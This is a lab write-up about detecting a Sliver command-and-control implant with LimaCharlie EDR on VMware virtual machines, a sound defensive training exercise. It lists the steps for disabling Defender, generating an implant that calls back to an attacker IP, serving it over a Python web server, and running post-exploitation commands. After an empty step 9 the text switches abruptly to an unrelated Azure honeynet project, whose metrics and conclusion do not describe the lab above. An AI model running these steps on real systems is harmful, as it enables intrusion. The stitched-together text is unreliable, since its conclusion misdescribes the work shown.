# End Point Detection with VMware and LimaCharlie


## Introduction

For this Lab I created a simple virtual envrionment using two VMware virtual machines and LimaCharlie end point detection and response (EDR). I added a sensore to ingest log data from our target VM, dropped a C2 payload created with Sliver, observed telemetry from the EDR, detected adversarial movements, and crafted detection and response rules.


## Architecture

The architecture of this lab consists of the following components:

- Windows 11 Virtual Machine (VMware)
- Ubuntu Server Virtual Machine (VMware)
- PuTTY SSH Client
- LimaCharlie End Point Detection and Response
- Sysmon


## Set up the virtual environment

1. Download and install VMware Workstation Pro 17.
    - I chose to buy the Pro version instead of the free trial since I plan on utilizing it a lot more in the future
2. Download and deploy a VMware evalustion version of Windows 11 from Microsoft.
3. Download and install Ubuntu Server 22.04.1
    - This specific versio of Ubuntu comes with the necessary packages preinstalled.
    - During the install process manually set the ipv4 address of the Ubuntu server so the IP address doesn't change during the lab
4. Set up the Windows VM
    - Disable Tamper Protection
    - Permanently disable Defender via the Group Policy Editor
    - Permanently disable Defender via Registry
    - Prevent the VM from going into standby via command prompt
      ![Disable Standby](https://i.imgur.com/zRszk5m.png)
    - Install Sysmon
    - Validate Sysmon is installed and running via Powershell with Get-Service sysmon64
      ![Validate](https://i.imgur.com/A2hozsA.png)
    - Check for presence of Sysmon Event logs
      ![Event Logs](https://i.imgur.com/VTBPH23.png)
    - Create a snapshot of the Winows VM to return to a clean point
5. Install LimaCharlie EDR on Windows VM
    - Create a free account with LimaCharlie and then create an organization with the Extended Detection and Response Standard template
    - Add a sensor. These are the primary input for data into LimaCharlie
      ![Add Sensor](https://i.imgur.com/ao00dka.png)
    - Download the sensore with Invoke-WebRequest in Powershell then install the sensor on our Endpoint via the Command Prompt.
      ![Add Sensor](https://i.imgur.com/vGFOpHH.png)
    - The new sensor is confirmed to be reporting in at this point.
    - Now we need to configure LimaCharlie to ship the Sysmon Event Logs along with its own telemetry
6. Set up the Attack System (Our Ubuntu Server)
    - Use PuTTY to access our Ubuntu VM through SSH
    - Move to root with "sudo su" command
    - Download Sliver command and control framework
    - Create a working directory for Sliver with mkdir command (mkdir -p /opt/sliver).
    - Once Sliver is installed into our new directory we can move to it and launch Sliver
    - Generate our payload once inside of Sliver with this command line "generate --http [Linux_VM_IP] --save /opt/sliver"
      ![Sliver](https://i.imgur.com/QSA7EuP.png)
    - Create a temporary web server with python (python3 -m http.server 80), then downlaod the payload on the Windows machine via Powershell
7. Start a Command and Control Session
    - After relaunching Sliver start an http listener in the console with the command "http"
    - Back on the Wndows VM I will just manually execute our C2 implant.exe within an administrative Powershell
    - We should see our C2 session appear in the Sliver console
      ![Sliver](https://i.imgur.com/9WzEhqH.png)
    - Typing "session" into the Sliver console we can take note of our session ID as well as confirm it's active
    - Next we can interact with our C2 session by using the command "use [session_id]" in the Sliver console
    - Now we can start exploring our windows system with some simple commands like "info", "whoami", and "getprivs", then identify our working directory with "pwd" and examine network conncetions with "netstat"
    - If we run the command "ps -t" we can view running processes on the Windows system and note how Sliver will highlight it's own processes in green and detect defensive tools in red. This is a good example of how attackers can become aware of defensive tools a victim might be using
      ![Sliver](https://i.imgur.com/9qPc4Km.png)
8. Observer EDR Telemetry thus far
    - Now we can hop into the LimaCharlie UI and check out some of the telemetry that has been collected from our end point
    - First look at some processes and spend some time exploring. Take note that LimaCharlie does a nice job of showing processes that are signed and ones that are not. A process that carries a valid signature is often going to be benign itself, although legitimate processes can be used to launch a malicious process or code. Below shows our payload as an unsigned processs (missing the green check) as well as an indicator that it is "listening".
       ![Sliver](https://i.imgur.com/cKMLdR0.png)
    - We can also view network connections from here and identify the destination IP this our payload process is communicating with
      ![Network Connection](https://i.imgur.com/rwyIODK.png)
    - Next we can explore the File System through Lima and find our payload in the downloads section. From there we can search the file hash in Virustotal although there is nothing found as we just created a new payload. This is a good time for a lesson, just because a hash is not found on Virustotal it does not mean that it is innocent.
    - We continue to explore through LimaCharlie and learn what it can show us and how we can further use the information to investigate as well as start to build detection and response.
9. 
    
      
      
      
      
      
   




# Attack Maps Before Hardening / Security Controls
## NSG Allowed Inbound Malicious Flows
![NSG Allowed Inbound Malicious Flows](https://i.imgur.com/reBkQwK.png)<br>
## Linux Syslog Auth Failures
![Linux Syslog Auth Failures](https://i.imgur.com/nbtZCT4.png)<br>
## Windows RDP/SMB Auth Failures
![Windows RDP/SMB Auth Failures](https://i.imgur.com/PogkqCa.png)<br>

## Metrics Before Hardening / Security Controls
For the "BEFORE" metrics, all resources were originally deployed, exposed to the internet. The Virtual Machines had both their Network Security Groups and built-in firewalls wide open, and all other resources are deployed with public endpoints visible to the Internet; aka, no use of Private Endpoints.

The following table shows the metrics we measured in our insecure environment for a 24 hour period:
Start Time 9/6/2023, 11:39:07 AM
Stop Time 9/7/2023, 11:39:07 AM

| Metric                   | Count
| ------------------------ | -----
| SecurityEvent            | 106656
| Syslog                   | 34270
| SecurityAlert            | 13
| SecurityIncident         | 329
| AzureNetworkAnalytics_CL | 2296

## Attack Maps After Hardening / Security Controls

```All map queries actually returned no results due to no instances of malicious activity for the 24 hour period after hardening.```

## Metrics After Hardening / Security Controls
For the "AFTER" metrics, Network Security Groups were hardened by blocking ALL traffic with the exception of allowing only the IP Address of my Admin workstation, and all other resources were protected by their built-in firewalls as well as utilizing Private Endpoints on the Key Vault and Storage Accounts, making them only accessible from within the Virtual Network.

The following table shows the metrics we measured in our environment for another 24 hours, after having applied the security controls:
Start Time 9/12/2023, 9:56:28 AM
Stop Time	9/13/2023, 9:56:28 AM

| Metric                   | Count
| ------------------------ | -----
| SecurityEvent            | 9543
| Syslog                   | 40295
| SecurityAlert            | 0
| SecurityIncident         | 0
| AzureNetworkAnalytics_CL | 0

## Conclusion

In conclusion, this lab project focused on the creation of a Honeynet with a Security Operations Center (SOC) in Azure, involving meticulous steps to assess and enhance security measures. The project encompassed the following key elements:

- **Architecture:** The Azure-based Honeynet comprised several vital components, including Virtual Network (VNet), Network Security Group (NSG), Virtual Machines (both Windows and Linux), Log Analytics Workspace, Azure Key Vault, Azure Storage Account, and Microsoft Sentinel, forming the foundation for security assessment and monitoring.

- **High-Level Steps:** The project followed a structured process, starting with the creation of the Honeynet environment, logging and monitoring setup, development of analytics rules for alerts, and observation of the environment's security posture. It emphasized the critical stages of incident response, remediation, and ultimately, the implementation of security controls based on both observed vulnerabilities and established standards such as NIST 800-53.

- **Security Transformation:** The project's initial metrics demonstrated vulnerabilities and potential threats in the unsecured environment, including significant event logs, alerts, incidents, and malicious network flows. Post-hardening, the metrics reflected a substantial reduction in security events, highlighting the effectiveness of security controls, including Network Security Group restrictions and the use of Private Endpoints.

Overall, this project illustrated the importance of proactive security measures in cloud environments, showcasing the transition from a vulnerable state to a significantly improved, more secure posture.

## A Few Notable Takeaways

- Rapid External Threats: The immediacy of external threats targeting both physical and virtual machines left exposed to the internet is a cause for serious concern. Notably, after bringing a Windows machine online, a multitude of failed login attempts from worldwide IP addresses occurred within minutes.

- Azure Proficiency and Adaptability: This project provided an opportunity to delve deeper into Azure and construct a more resilient network compared to previous endeavors. It underscored the importance of staying updated, given the frequent and sometimes daily alterations within the Azure environment.

- Expanding Skill Set: This project enriched my practical expertise and enhanced my skills in various areas, including Azure, Microsoft Sentinel (SIEM), Microsoft Defender for Cloud, Kusto Query Language (KQL), JSON, incident response, response playbooks, firewall configurations, network security groups, subnets, and private endpoints, among others.
